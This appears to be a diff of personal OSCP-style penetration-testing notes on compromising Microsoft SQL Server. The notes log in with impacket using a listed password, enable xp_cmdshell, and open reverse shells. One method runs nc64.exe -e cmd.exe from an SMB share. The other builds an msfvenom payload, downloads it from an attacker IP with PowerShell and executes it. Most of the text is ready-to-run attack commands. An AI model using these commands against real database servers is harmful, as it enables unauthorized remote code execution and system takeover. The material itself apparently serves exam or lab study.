@@ -12,19 +12,62 @@ mssqlclient.py -windows-auth oscp.exam/sql_svc:'Dolphin1'@10.10.159.148
 - also try without `-windows-auth`
 
 once connected to SQL, try enabling xp_cmdshell to run commands:
-SQL> `use master`
+SQL> 
+```
+use master
+```
 [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
 [*] INFO(MS02\SQLEXPRESS): Line 1: Changed database context to 'master'.
-SQL> `sp_configure 'show advanced options', '1'`
+SQL> 
+```
+sp_configure 'show advanced options', '1'
+```
 [*] INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
-SQL> `RECONFIGURE`
-SQL> `sp_configure 'xp_cmdshell', '1'`
+SQL> 
+```
+RECONFIGURE
+```
+SQL> 
+```
+sp_configure 'xp_cmdshell', '1'
+```
 [*] INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
-SQL> `RECONFIGURE`
-SQL> `EXEC master..xp_cmdshell 'whoami'`
-nt service\mssql$sqlexpress                                                                                     
-SQL > `exec xp_cmdshell "powershell -c iwr -uri http://10.10.126.147:83/payload_1234.exe -Outfile c:\windows\temp\payload_1234.exe"`
-SQL> `exec xp_cmdshell "powershell -c c:\windows\temp\payload_1234.exe"`
+SQL> 
+```
+RECONFIGURE
+```
+SQL> 
+```
+EXEC master..xp_cmdshell 'whoami'
+```
+- shows response under output
+Shell with nc64:
+- put nc64.exe in current linux directory and start smbserver:
+```
+smbserver.py test . -smb2support
+```
+- start listener:
+```
+rlwrap -cAr nc -lvnp 443
+```
+- run command from mssql:
+```
+xp_cmdshell \\10.10.14.169\test\nc64.exe -e cmd.exe 10.10.14.169 443
+```
+- should catch shell with listener
+
+Alt path for shell once xp_cmdshell if enabled:
+- generate shell payload with msfvenom:
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.126.147 LPORT=1234 -f exe -o payload_1234.exe
+```
+- run two commands from mssql SQL >
+```
+exec xp_cmdshell "powershell -c iwr -uri http://10.10.126.147:83/payload_1234.exe -Outfile c:\windows\temp\payload_1234.exe"
+```
+```
+exec xp_cmdshell "powershell -c c:\windows\temp\payload_1234.exe"
+```
 
 if no xp_cmdshell permissions, try xp_dirtree & impacket smbserver:
 ```
